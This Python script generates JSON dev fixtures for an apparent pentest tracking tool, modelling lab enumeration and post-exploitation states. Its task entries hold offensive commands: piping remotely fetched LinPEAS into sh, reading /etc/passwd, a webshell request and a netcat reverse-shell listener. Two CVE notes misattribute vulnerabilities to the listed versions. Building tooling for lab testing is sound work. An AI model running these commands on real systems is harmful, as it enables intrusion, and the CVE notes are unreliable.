#!/usr/bin/env python3
"""
Generate sample dev fixtures for rapid testing

Creates 4 fixtures representing common OSCP enumeration states:
1. minimal - Fresh start with discovered services
2. web-enum - HTTP enumeration completed
3. smb-shares - SMB discovery completed
4. post-exploit - Initial access achieved

Usage:
    python3 generate_sample_fixtures.py
"""

import json
import sys
from pathlib import Path
from datetime import datetime

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from crack.track.core.fixtures import FixtureStorage


def generate_minimal_fixture():
    """Fresh start with services discovered, no tasks completed"""
    return {
        "_fixture_metadata": {
            "name": "minimal",
            "description": "Fresh start with HTTP and SSH services discovered",
            "created": datetime.now().isoformat(),
            "source_target": "sample",
            "phase": "service-specific",
            "port_count": 2,
            "finding_count": 0,
            "task_count": 8
        },
        "target": "192.168.45.100",
        "created": datetime.now().isoformat(),
        "updated": datetime.now().isoformat(),
        "phase": "service-specific",
        "status": "in-progress",
        "ports": {
            "22": {
                "state": "open",
                "service": "ssh",
                "version": "OpenSSH 8.2p1 Ubuntu",
                "source": "nmap -sV",
                "updated_at": datetime.now().isoformat()
            },
            "80": {
                "state": "open",
                "service": "http",
                "version": "Apache httpd 2.4.41",
                "source": "nmap -sV",
                "updated_at": datetime.now().isoformat()
            }
        },
        "findings": [],
        "credentials": [],
        "notes": [],
        "imported_files": [
            {
                "file": "scan_results.xml",
                "type": "nmap",
                "timestamp": datetime.now().isoformat()
            }
        ],
        "metadata": {
            "environment": "lab",
            "default_timing": "normal",
            "preferred_profile": None,
            "evasion_enabled": False,
            "confirmation_mode": "smart"
        },
        "scan_history": [],
        "task_tree": {
            "id": "root",
            "name": "Enumeration: 192.168.45.100",
            "type": "parent",
            "status": "in-progress",
            "metadata": {},
            "children": [
                {
                    "id": "http-enum-80",
                    "name": "HTTP Enumeration (Port 80)",
                    "type": "parent",
                    "status": "pending",
                    "metadata": {},
                    "children": [
                        {
                            "id": "whatweb-80",
                            "name": "Identify Web Technologies (whatweb)",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "whatweb http://192.168.45.100",
                                "port": 80
                            },
                            "children": []
                        },
                        {
                            "id": "gobuster-80",
                            "name": "Directory Enumeration (gobuster)",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "gobuster dir -u http://192.168.45.100 -w /usr/share/wordlists/dirb/common.txt",
                                "port": 80
                            },
                            "children": []
                        },
                        {
                            "id": "nikto-80",
                            "name": "Web Vulnerability Scanner (nikto)",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "nikto -h http://192.168.45.100",
                                "port": 80
                            },
                            "children": []
                        }
                    ]
                },
                {
                    "id": "ssh-enum-22",
                    "name": "SSH Enumeration (Port 22)",
                    "type": "parent",
                    "status": "pending",
                    "metadata": {},
                    "children": [
                        {
                            "id": "ssh-version-22",
                            "name": "Check SSH Version for Exploits",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "searchsploit OpenSSH 8.2",
                                "port": 22
                            },
                            "children": []
                        }
                    ]
                }
            ]
        }
    }


def generate_web_enum_fixture():
    """HTTP enumeration completed with findings"""
    return {
        "_fixture_metadata": {
            "name": "web-enum",
            "description": "HTTP enumeration completed (gobuster + nikto done)",
            "created": datetime.now().isoformat(),
            "source_target": "sample",
            "phase": "service-specific",
            "port_count": 2,
            "finding_count": 3,
            "task_count": 8
        },
        "target": "192.168.45.100",
        "created": datetime.now().isoformat(),
        "updated": datetime.now().isoformat(),
        "phase": "service-specific",
        "status": "in-progress",
        "ports": {
            "22": {
                "state": "open",
                "service": "ssh",
                "version": "OpenSSH 8.2p1 Ubuntu",
                "source": "nmap -sV",
                "updated_at": datetime.now().isoformat()
            },
            "80": {
                "state": "open",
                "service": "http",
                "version": "Apache httpd 2.4.41",
                "source": "nmap -sV",
                "updated_at": datetime.now().isoformat()
            }
        },
        "findings": [
            {
                "timestamp": datetime.now().isoformat(),
                "type": "directory",
                "description": "/admin",
                "source": "gobuster dir -u http://192.168.45.100 -w /usr/share/wordlists/dirb/common.txt"
            },
            {
                "timestamp": datetime.now().isoformat(),
                "type": "directory",
                "description": "/uploads",
                "source": "gobuster dir -u http://192.168.45.100 -w /usr/share/wordlists/dirb/common.txt"
            },
            {
                "timestamp": datetime.now().isoformat(),
                "type": "vulnerability",
                "description": "OSVDB-3268: Directory indexing enabled on /uploads/",
                "source": "nikto -h http://192.168.45.100"
            }
        ],
        "credentials": [],
        "notes": [
            {
                "timestamp": datetime.now().isoformat(),
                "note": "Apache 2.4.41 - check for CVE-2021-41773 (path traversal)",
                "source": "manual"
            }
        ],
        "imported_files": [
            {
                "file": "scan_results.xml",
                "type": "nmap",
                "timestamp": datetime.now().isoformat()
            }
        ],
        "metadata": {
            "environment": "lab",
            "default_timing": "normal",
            "preferred_profile": None,
            "evasion_enabled": False,
            "confirmation_mode": "smart"
        },
        "scan_history": [],
        "task_tree": {
            "id": "root",
            "name": "Enumeration: 192.168.45.100",
            "type": "parent",
            "status": "in-progress",
            "metadata": {},
            "children": [
                {
                    "id": "http-enum-80",
                    "name": "HTTP Enumeration (Port 80)",
                    "type": "parent",
                    "status": "in-progress",
                    "metadata": {},
                    "children": [
                        {
                            "id": "whatweb-80",
                            "name": "Identify Web Technologies (whatweb)",
                            "type": "executable",
                            "status": "completed",
                            "metadata": {
                                "command": "whatweb http://192.168.45.100",
                                "port": 80,
                                "output": "http://192.168.45.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.45.100], Title[Welcome]"
                            },
                            "children": []
                        },
                        {
                            "id": "gobuster-80",
                            "name": "Directory Enumeration (gobuster)",
                            "type": "executable",
                            "status": "completed",
                            "metadata": {
                                "command": "gobuster dir -u http://192.168.45.100 -w /usr/share/wordlists/dirb/common.txt",
                                "port": 80,
                                "output": "/admin (Status: 301)\n/uploads (Status: 200)"
                            },
                            "children": []
                        },
                        {
                            "id": "nikto-80",
                            "name": "Web Vulnerability Scanner (nikto)",
                            "type": "executable",
                            "status": "completed",
                            "metadata": {
                                "command": "nikto -h http://192.168.45.100",
                                "port": 80,
                                "output": "+ Server: Apache/2.4.41 (Ubuntu)\n+ OSVDB-3268: /uploads/: Directory indexing found."
                            },
                            "children": []
                        },
                        {
                            "id": "inspect-admin-80",
                            "name": "Inspect /admin Directory",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "curl -i http://192.168.45.100/admin/",
                                "port": 80,
                                "finding_source": "directory:/admin"
                            },
                            "children": []
                        },
                        {
                            "id": "inspect-uploads-80",
                            "name": "Inspect /uploads Directory",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "curl -i http://192.168.45.100/uploads/",
                                "port": 80,
                                "finding_source": "directory:/uploads"
                            },
                            "children": []
                        }
                    ]
                }
            ]
        }
    }


def generate_smb_shares_fixture():
    """SMB enumeration completed"""
    return {
        "_fixture_metadata": {
            "name": "smb-shares",
            "description": "SMB enumeration completed (enum4linux done, shares discovered)",
            "created": datetime.now().isoformat(),
            "source_target": "sample",
            "phase": "service-specific",
            "port_count": 3,
            "finding_count": 2,
            "task_count": 6
        },
        "target": "192.168.45.100",
        "created": datetime.now().isoformat(),
        "updated": datetime.now().isoformat(),
        "phase": "service-specific",
        "status": "in-progress",
        "ports": {
            "22": {
                "state": "open",
                "service": "ssh",
                "version": "OpenSSH 8.2p1 Ubuntu",
                "source": "nmap -sV",
                "updated_at": datetime.now().isoformat()
            },
            "139": {
                "state": "open",
                "service": "netbios-ssn",
                "version": "Samba smbd 4.13.13-Ubuntu",
                "source": "nmap -sV",
                "updated_at": datetime.now().isoformat()
            },
            "445": {
                "state": "open",
                "service": "microsoft-ds",
                "version": "Samba smbd 4.13.13-Ubuntu",
                "source": "nmap -sV",
                "updated_at": datetime.now().isoformat()
            }
        },
        "findings": [
            {
                "timestamp": datetime.now().isoformat(),
                "type": "service",
                "description": "SMB shares: print$, IPC$, files",
                "source": "enum4linux -S 192.168.45.100"
            },
            {
                "timestamp": datetime.now().isoformat(),
                "type": "vulnerability",
                "description": "Anonymous access allowed on 'files' share",
                "source": "smbclient -N -L //192.168.45.100"
            }
        ],
        "credentials": [],
        "notes": [
            {
                "timestamp": datetime.now().isoformat(),
                "note": "Samba 4.13.13 - check for SMBGhost (CVE-2020-0796)",
                "source": "manual"
            }
        ],
        "imported_files": [
            {
                "file": "scan_results.xml",
                "type": "nmap",
                "timestamp": datetime.now().isoformat()
            }
        ],
        "metadata": {
            "environment": "lab",
            "default_timing": "normal",
            "preferred_profile": None,
            "evasion_enabled": False,
            "confirmation_mode": "smart"
        },
        "scan_history": [],
        "task_tree": {
            "id": "root",
            "name": "Enumeration: 192.168.45.100",
            "type": "parent",
            "status": "in-progress",
            "metadata": {},
            "children": [
                {
                    "id": "smb-enum-445",
                    "name": "SMB Enumeration (Port 445)",
                    "type": "parent",
                    "status": "in-progress",
                    "metadata": {},
                    "children": [
                        {
                            "id": "enum4linux-445",
                            "name": "SMB Enumeration (enum4linux)",
                            "type": "executable",
                            "status": "completed",
                            "metadata": {
                                "command": "enum4linux -a 192.168.45.100",
                                "port": 445,
                                "output": "[+] Got domain/workgroup name: WORKGROUP\n[+] Server allows session using username '', password ''\n[+] Shares: print$, IPC$, files"
                            },
                            "children": []
                        },
                        {
                            "id": "smbmap-445",
                            "name": "Map SMB Shares (smbmap)",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "smbmap -H 192.168.45.100",
                                "port": 445
                            },
                            "children": []
                        },
                        {
                            "id": "smbclient-files-445",
                            "name": "Mount 'files' Share (smbclient)",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "smbclient -N //192.168.45.100/files",
                                "port": 445,
                                "finding_source": "service:SMB shares: print$, IPC$, files"
                            },
                            "children": []
                        }
                    ]
                }
            ]
        }
    }


def generate_post_exploit_fixture():
    """Initial access achieved, ready for privesc"""
    return {
        "_fixture_metadata": {
            "name": "post-exploit",
            "description": "Initial access achieved via www-data shell, privesc pending",
            "created": datetime.now().isoformat(),
            "source_target": "sample",
            "phase": "exploitation",
            "port_count": 2,
            "finding_count": 4,
            "task_count": 10
        },
        "target": "192.168.45.100",
        "created": datetime.now().isoformat(),
        "updated": datetime.now().isoformat(),
        "phase": "exploitation",
        "status": "in-progress",
        "ports": {
            "22": {
                "state": "open",
                "service": "ssh",
                "version": "OpenSSH 8.2p1 Ubuntu",
                "source": "nmap -sV",
                "updated_at": datetime.now().isoformat()
            },
            "80": {
                "state": "open",
                "service": "http",
                "version": "Apache httpd 2.4.41",
                "source": "nmap -sV",
                "updated_at": datetime.now().isoformat()
            }
        },
        "findings": [
            {
                "timestamp": datetime.now().isoformat(),
                "type": "vulnerability",
                "description": "File upload bypass via .php.jpg extension",
                "source": "Manual testing on /uploads/ directory"
            },
            {
                "timestamp": datetime.now().isoformat(),
                "type": "vulnerability",
                "description": "Remote code execution via uploaded PHP webshell",
                "source": "curl http://192.168.45.100/uploads/shell.php.jpg?cmd=id"
            },
            {
                "timestamp": datetime.now().isoformat(),
                "type": "vulnerability",
                "description": "Reverse shell obtained as www-data",
                "source": "nc -lvnp 4444 (listener) + bash reverse shell payload"
            },
            {
                "timestamp": datetime.now().isoformat(),
                "type": "user",
                "description": "Local users: root, www-data, john",
                "source": "cat /etc/passwd"
            }
        ],
        "credentials": [
            {
                "timestamp": datetime.now().isoformat(),
                "username": "www-data",
                "password": None,
                "hash": None,
                "source": "Reverse shell access",
                "service": "shell",
                "port": None
            }
        ],
        "notes": [
            {
                "timestamp": datetime.now().isoformat(),
                "note": "Current shell: www-data@target:/var/www/html",
                "source": "manual"
            },
            {
                "timestamp": datetime.now().isoformat(),
                "note": "Need to stabilize shell and run LinPEAS",
                "source": "manual"
            }
        ],
        "imported_files": [
            {
                "file": "scan_results.xml",
                "type": "nmap",
                "timestamp": datetime.now().isoformat()
            }
        ],
        "metadata": {
            "environment": "lab",
            "default_timing": "normal",
            "preferred_profile": None,
            "evasion_enabled": False,
            "confirmation_mode": "smart"
        },
        "scan_history": [],
        "task_tree": {
            "id": "root",
            "name": "Enumeration: 192.168.45.100",
            "type": "parent",
            "status": "in-progress",
            "metadata": {},
            "children": [
                {
                    "id": "post-exploit-root",
                    "name": "Post-Exploitation",
                    "type": "parent",
                    "status": "in-progress",
                    "metadata": {},
                    "children": [
                        {
                            "id": "stabilize-shell",
                            "name": "Stabilize Shell",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
                            },
                            "children": []
                        },
                        {
                            "id": "linpeas",
                            "name": "Run LinPEAS Enumeration",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
                            },
                            "children": []
                        },
                        {
                            "id": "suid-enum",
                            "name": "Find SUID Binaries",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "find / -perm -4000 -type f 2>/dev/null"
                            },
                            "children": []
                        },
                        {
                            "id": "cron-enum",
                            "name": "Check Cron Jobs",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "cat /etc/crontab && ls -la /etc/cron.*"
                            },
                            "children": []
                        },
                        {
                            "id": "kernel-version",
                            "name": "Check Kernel Version for Exploits",
                            "type": "executable",
                            "status": "pending",
                            "metadata": {
                                "command": "uname -a && searchsploit linux kernel"
                            },
                            "children": []
                        }
                    ]
                }
            ]
        }
    }


def main():
    """Generate all sample fixtures"""
    fixtures_dir = FixtureStorage.FIXTURES_DIR
    fixtures_dir.mkdir(parents=True, exist_ok=True)

    fixtures = {
        "minimal": generate_minimal_fixture(),
        "web-enum": generate_web_enum_fixture(),
        "smb-shares": generate_smb_shares_fixture(),
        "post-exploit": generate_post_exploit_fixture()
    }

    print("Generating sample dev fixtures...\n")

    for name, data in fixtures.items():
        fixture_path = fixtures_dir / f"{name}.json"
        with open(fixture_path, 'w') as f:
            json.dump(data, f, indent=2)

        metadata = data['_fixture_metadata']
        print(f"✓ Created: {name}")
        print(f"  Description: {metadata['description']}")
        print(f"  Phase: {metadata['phase']} | Ports: {metadata['port_count']} | Findings: {metadata['finding_count']} | Tasks: {metadata['task_count']}")
        print(f"  Location: {fixture_path}")
        print()

    print(f"Total fixtures created: {len(fixtures)}")
    print(f"\nUsage:")
    print(f"  crack track --dev-list                    # List all fixtures")
    print(f"  crack track --dev=minimal <target>        # Load minimal fixture")
    print(f"  crack track --dev=web-enum <target>       # Load web-enum fixture")
    print(f"  crack track --dev-show minimal            # Preview fixture")


if __name__ == '__main__':
    main()
